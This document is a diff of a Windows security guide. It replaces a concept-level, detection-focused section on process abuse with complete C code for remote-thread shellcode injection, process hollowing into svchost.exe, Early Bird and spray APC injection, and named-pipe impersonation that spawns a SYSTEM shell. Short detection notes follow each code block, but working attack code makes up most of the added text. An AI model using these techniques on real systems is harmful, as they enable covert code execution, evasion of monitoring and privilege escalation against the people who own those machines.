@@ -753,100 +753,330 @@ dt nt!_EPROCESS <addr> Protection
 
 ---
 
-## 8. Abuse Patterns — Concept Level
+## 8. Abuse Techniques — Code Examples
 
-### 8.1 Cross-process memory telemetry model
+### 8.1 Process Injection — Classic (VirtualAllocEx + CreateRemoteThread)
 
-**Threat model:** Một process tác động lên address space hoặc execution context của process khác. Đây là lớp hành vi quan trọng cho malware analysis và EDR architecture, nhưng chương này giữ ở mức conceptual/detection.
+**Concept:** Inject shellcode vào process khác bằng cách cấp phát memory trong target, write shellcode, tạo remote thread để thực thi.
 
-```text
-1. Source process obtains a handle to target process/thread.
-2. Source process requests memory allocation, mapping, protection change, or write-like operation.
-3. Target address space gains a new or modified VAD/section/page state.
-4. Execution context changes through a new thread, existing thread, APC-like delivery, or context transition.
-5. Researcher correlates: handle access → memory/VAD delta → thread/context signal → module/section state → resulting behavior.
+```c
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c -b “\x00”
+unsigned char shellcode[] =
+    “\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18”
+    “\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49”
+    /* ... full shellcode ... */;
+
+BOOL InjectIntoProcess(DWORD targetPID) {
+    printf(“[*] Injecting into PID %lu\n”, targetPID);
+
+    HANDLE hProcess = OpenProcess(
+        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
+        FALSE, targetPID);
+    if (!hProcess) {
+        printf(“[-] OpenProcess failed: %lu\n”, GetLastError());
+        return FALSE;
+    }
+
+    // Two-step alloc: RW → RX (ít noisy hơn RWX)
+    LPVOID mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, mem, shellcode, sizeof(shellcode), NULL);
+
+    DWORD oldProtect;
+    VirtualProtectEx(hProcess, mem, sizeof(shellcode),
+        PAGE_EXECUTE_READ, &oldProtect);
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+
+    printf(“[+] Remote thread TID: %lu\n”, GetThreadId(hThread));
+    WaitForSingleObject(hThread, 5000);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return TRUE;
+}
+// Compile: cl /nologo inject.c /link /out:inject.exe
 ```
 
-**Detection signals:**
-- Cross-process handle access with VM/thread rights.
-- VAD region with unusual protection/backing source.
-- Thread start address outside expected image-backed regions.
-- Image load mismatch or missing loader metadata.
-- ETW-TI / kernel callback / Sysmon-style events if configured.
+**Detection:**
+- Sysmon Event 10: source process → target process với `PROCESS_VM_WRITE` rights
+- Sysmon Event 8 (CreateRemoteThread): start address = private memory region
+- ETW-TI `ALLOCVM` + `PROTECTVM` + `WRITEVM` sequence trong target process
 
-**Visibility limits:**
-- User-mode API hooks can miss lower-layer/native call paths.
-- Kernel callbacks see important transitions but not every semantic detail.
-- Memory-mapped or section-based behavior may not look like a simple write API.
-- High-signal anomaly still requires context and correlation.
+---
 
-### 8.2 Token abuse threat model và impersonation-risk
+### 8.2 Process Hollowing
 
-**Threat model:** Một process obtains or duplicates a token/impersonation capability that changes the security context of a thread or child process.
+**Concept:** Tạo process ở Suspended state, unmap image gốc, inject payload PE, patch entry point, resume. Process trông hợp lệ (image path = svchost.exe) nhưng chạy payload.
 
-```text
-1. Source process opens a target process/token with query/duplicate-like rights.
-2. A duplicate or impersonation token is created or assigned.
-3. A thread or child process uses the changed security context.
-4. Detection correlates process access, token rights, privileges, logon session, and resulting process/thread token state.
+```c
+#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+
+typedef NTSTATUS (NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
+
+BOOL ProcessHollow(const wchar_t* hostExe, const wchar_t* payloadExe) {
+    // 1. Đọc payload từ disk vào buffer
+    HANDLE hFile = CreateFileW(payloadExe, GENERIC_READ, FILE_SHARE_READ,
+        NULL, OPEN_EXISTING, 0, NULL);
+    DWORD payloadSize = GetFileSize(hFile, NULL);
+    BYTE* payload = (BYTE*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT, PAGE_READWRITE);
+    DWORD bytesRead = 0;
+    ReadFile(hFile, payload, payloadSize, &bytesRead, NULL);
+    CloseHandle(hFile);
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);
+    DWORD_PTR preferredBase = nt->OptionalHeader.ImageBase;
+    DWORD    imageSize      = nt->OptionalHeader.SizeOfImage;
+
+    // 2. Spawn host process suspended
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    if (!CreateProcessW(hostExe, NULL, NULL, NULL, FALSE,
+            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf(“[-] CreateProcess failed: %lu\n”, GetLastError());
+        return FALSE;
+    }
+    printf(“[+] Created suspended PID %lu (host: %ls)\n”, pi.dwProcessId, hostExe);
+
+    // 3. Lấy PEB address qua thread context (x64: Rdx = PEB khi process mới tạo)
+    CONTEXT ctx = { CONTEXT_FULL };
+    GetThreadContext(pi.hThread, &ctx);
+    // PEB.ImageBaseAddress ở offset 0x10 (x64)
+    PVOID pebImageBase = NULL;
+    ReadProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10,
+        &pebImageBase, sizeof(pebImageBase), NULL);
+    printf(“[*] Host image base: %p\n”, pebImageBase);
+
+    // 4. Unmap host image
+    NtUnmapViewOfSection_t NtUnmap = (NtUnmapViewOfSection_t)
+        GetProcAddress(GetModuleHandleA(“ntdll.dll”), “NtUnmapViewOfSection”);
+    NtUnmap(pi.hProcess, pebImageBase);
+
+    // 5. Allocate ở preferred base của payload
+    PVOID remoteBase = VirtualAllocEx(pi.hProcess, (PVOID)preferredBase, imageSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteBase) {
+        // Preferred base taken, alloc anywhere và apply relocations (simplified: skip here)
+        remoteBase = VirtualAllocEx(pi.hProcess, NULL, imageSize,
+            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    }
+    printf(“[*] Remote alloc at: %p\n”, remoteBase);
+
+    // 6. Write PE headers
+    WriteProcessMemory(pi.hProcess, remoteBase,
+        payload, nt->OptionalHeader.SizeOfHeaders, NULL);
+
+    // 7. Write each section
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+        WriteProcessMemory(pi.hProcess,
+            (PBYTE)remoteBase + sec->VirtualAddress,
+            payload + sec->PointerToRawData,
+            sec->SizeOfRawData, NULL);
+    }
+
+    // 8. Patch PEB.ImageBaseAddress → new base
+    WriteProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10,
+        &remoteBase, sizeof(remoteBase), NULL);
+
+    // 9. Patch RCX (entry point) in thread context
+    ctx.Rcx = (DWORD64)remoteBase + nt->OptionalHeader.AddressOfEntryPoint;
+    SetThreadContext(pi.hThread, &ctx);
+    printf(“[+] Entry point set to: %llx\n”, ctx.Rcx);
+
+    // 10. Resume — payload runs
+    ResumeThread(pi.hThread);
+
+    VirtualFree(payload, 0, MEM_RELEASE);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return TRUE;
+}
+
+// Usage: ProcessHollow(L”C:\\Windows\\System32\\svchost.exe”, L”C:\\payload.exe”);
+// Compile: cl /nologo hollow.c /link /out:hollow.exe
 ```
 
-**Detection signals:** process access to sensitive processes, token handle operations, privilege use, unusual logon session relationships, child process under unexpected identity.
+**Detection:**
+- ETW-TI `UNMAPVIEW` trên process vừa được tạo (suspended) → unusual
+- ETW-TI `ALLOCVM` + `WRITEVM` sequence vào suspended process
+- Memory forensics: `!vad` — VAD node type là MEM_IMAGE (svchost.exe) nhưng content là payload PE
+- Volatility `cmdline` và `dlllist` có thể show mismatch với actual image content
+- `SetThreadContext` captured bởi Sysmon Event 8 trên một số config
 
-### 8.3 Image replacement / hollowing-style mismatch class
+---
 
-**Threat model:** Process metadata suggests one image while memory/runtime state indicates another or modified image layout.
+### 8.3 APC Injection (Early Bird)
 
-Researcher should compare:
+**Concept:** Queue một Asynchronous Procedure Call vào thread của process. “Early Bird” = inject APC vào main thread của suspended process → APC thực thi khi thread enters alertable state (ngay sau resume).
 
-- Process image path and command line captured at creation.
-- PEB image metadata and loader lists.
-- VAD/MEM_IMAGE/MEM_PRIVATE layout.
-- On-disk hash/signature vs mapped image bytes where available.
-- Thread start address and module backing.
+```c
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
 
-This is a **mismatch analysis class**, not a step-by-step technique guide.
+// Early Bird APC — inject vào suspended process trước khi resume
+BOOL EarlyBirdAPC(const wchar_t* targetExe, BYTE* shellcode, SIZE_T shellcodeSize) {
+    // Tạo target process ở suspended state
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    if (!CreateProcessW(targetExe, NULL, NULL, NULL, FALSE,
+            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf(“[-] CreateProcess failed: %lu\n”, GetLastError());
+        return FALSE;
+    }
+    printf(“[+] Suspended PID: %lu, TID: %lu\n”, pi.dwProcessId, pi.dwThreadId);
 
-### 8.4 Parent PID and command-line trust limitations
+    // Alloc shellcode trong target
+    PVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcodeSize, NULL);
+    printf(“[*] Shellcode at: %p\n”, remoteMem);
 
-PPID and command line are useful but not absolute truth.
+    // Queue APC vào main thread — fires khi thread enters alertable wait
+    // NtTestAlert() hoặc SleepEx(0, TRUE) triggers APC execution
+    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0);
+    printf(“[+] APC queued\n”);
 
-- Parent PID can be influenced by documented process creation attributes.
-- Parent process may exit before analysis.
-- Command line can differ between kernel-captured creation time, PEB user-mode view, EDR backend normalization, and later process memory state.
-- Always record source layer: kernel callback, ETW, WMI, PEB read, EDR event, or command-line API.
+    // Resume — main thread enters alertable state → shellcode fires
+    ResumeThread(pi.hThread);
 
-### 8.5 Job boundary escape-risk model
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return TRUE;
+}
 
-Job objects constrain process trees, resources, and breakaway behavior. Researcher should inspect:
+// Inject APC vào existing thread của running process
+BOOL APCInjectRunning(DWORD targetPID, BYTE* shellcode, SIZE_T shellcodeSize) {
+    HANDLE hProcess = OpenProcess(
+        PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, targetPID);
 
-- Whether process is in a job.
-- Job limits and UI/security restrictions.
-- Breakaway flags and child process relationships.
-- Processes outside the job that hold handles into the job-contained process.
+    PVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL);
 
-Do not assume job membership alone proves containment.
+    // Queue APC vào tất cả threads của target (spray — ít nhất một sẽ vào alertable state)
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 te = { sizeof(te) };
+    int count = 0;
+    if (Thread32First(snap, &te)) {
+        do {
+            if (te.th32OwnerProcessID == targetPID) {
+                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
+                if (hThread) {
+                    QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0);
+                    CloseHandle(hThread);
+                    count++;
+                }
+            }
+        } while (Thread32Next(snap, &te));
+    }
+    CloseHandle(snap);
+    CloseHandle(hProcess);
+    printf(“[+] APC queued to %d threads\n”, count);
+    return TRUE;
+}
+// Compile: cl /nologo apc_inject.c /link /out:apc.exe
+```
 
-### 8.6 Mitigation visibility-gap primitives
+**Detection:**
+- ETW-TI `QUEUEUSERAPC`: capture QueueUserAPC calls — target process, APC routine address
+- Thread start address trong private memory region khi APC fires
+- Sysmon Event 8 được một số EDR trigger cho APC injection (tùy implementation)
+- `ObRegisterCallbacks`: OpenProcess với VM_WRITE rights để alloc shellcode
 
-| Mitigation | Researcher concern | Defensive interpretation |
-|------------|-------------------|--------------------------|
-| DEP/NX | Existing executable memory may still be abused by control-flow bugs | Look for memory protection changes and abnormal control flow |
-| ASLR | Information disclosure can weaken randomization | Treat leaks and predictable mappings as exploitability context |
-| CFG | Indirect-call validation has scope/config limits | Validate module CFG metadata and call-target anomalies carefully |
-| CET / Shadow Stack | Hardware/OS/config support varies | Confirm feature state before assuming coverage |
-| ACG | Applies per process/policy | Compare target process mitigation flags and actual memory state |
-| Stack Canary | Compiler/runtime mitigation, not universal | Requires binary-specific analysis |
+---
 
-### 8.7 Safe wording for process abuse classes
+### 8.4 Token Impersonation — Named Pipe Trick
 
-Use professional language in reports:
+**Concept:** Tạo named pipe server, trick một SYSTEM process vào connect → `ImpersonateNamedPipeClient()` lấy token của SYSTEM process → escalate.
 
-- “cross-process memory tampering signal,” not operational implementation wording.
-- “token impersonation-risk,” not operational token-abuse instructions.
-- “parent PID trust limitation,” not “spoofing how-to.”
-- “image/memory mismatch,” not “hollowing playbook.”
-- “sensor coverage limitation,” not operational avoidance language.
+```c
+#include <windows.h>
+#include <stdio.h>
+#include <aclapi.h>
+
+// Technique: Named Pipe Impersonation để leo thang SYSTEM
+// Thường dùng kết hợp với một service hoặc scheduled task trigger connect đến pipe
+BOOL PipeImpersonation() {
+    // 1. Tạo named pipe với NULL DACL (everyone can connect)
+    SECURITY_DESCRIPTOR sd;
+    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
+    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE); // NULL DACL = everyone
+
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), &sd, FALSE };
+
+    HANDLE hPipe = CreateNamedPipeW(
+        L”\\\\.\\pipe\\legit_pipe”,   // pipe name
+        PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+        1,        // max instances
+        4096, 4096, 0, &sa);
+
+    if (hPipe == INVALID_HANDLE_VALUE) {
+        printf(“[-] CreateNamedPipe failed: %lu\n”, GetLastError());
+        return FALSE;
+    }
+    printf(“[*] Pipe created: \\\\.\\pipe\\legit_pipe\n”);
+    printf(“[*] Waiting for SYSTEM client to connect...\n”);
+
+    // 2. Chờ client (SYSTEM process) kết nối
+    ConnectNamedPipe(hPipe, NULL);
+    printf(“[+] Client connected!\n”);
+
+    // 3. Impersonate client — lấy security context của client
+    if (!ImpersonateNamedPipeClient(hPipe)) {
+        printf(“[-] ImpersonateNamedPipeClient failed: %lu\n”, GetLastError());
+        CloseHandle(hPipe);
+        return FALSE;
+    }
+
+    // 4. Verify identity sau impersonation
+    HANDLE hToken;
+    OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken);
+
+    DWORD infoLen = 0;
+    GetTokenInformation(hToken, TokenUser, NULL, 0, &infoLen);
+    PTOKEN_USER pUser = (PTOKEN_USER)LocalAlloc(LPTR, infoLen);
+    GetTokenInformation(hToken, TokenUser, pUser, infoLen, &infoLen);
+
+    char userName[256], domainName[256];
+    DWORD userLen = 256, domainLen = 256;
+    SID_NAME_USE sidType;
+    LookupAccountSidA(NULL, pUser->User.Sid, userName, &userLen, domainName, &domainLen, &sidType);
+    printf(“[+] Impersonating: %s\\%s\n”, domainName, userName);
+
+    // 5. Nếu là SYSTEM → spawn SYSTEM shell với impersonation token
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    // CreateProcessWithTokenW cần primary token — convert impersonation → primary
+    HANDLE hPrimary;
+    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
+        SecurityImpersonation, TokenPrimary, &hPrimary);
+    CreateProcessWithTokenW(hPrimary, LOGON_WITH_PROFILE,
+        L”C:\\Windows\\System32\\cmd.exe”,
+        NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+
+    LocalFree(pUser);
+    CloseHandle(hToken);
+    CloseHandle(hPrimary);
+    CloseHandle(hPipe);
+    return TRUE;
+}
+// Compile: cl /nologo pipe_impersonate.c advapi32.lib /link /out:pipe_imp.exe
+```
+
+**Detection:**
+- Sysmon Event 17/18 (PipeCreated/PipeConnected): pipe tạo bởi non-system process với SYSTEM client connect
+- Security Event 4648: Logon attempt with explicit credentials
+- `ImpersonateNamedPipeClient` → thread token change → Security Event 4616 (token assignment)
 
 ---
 
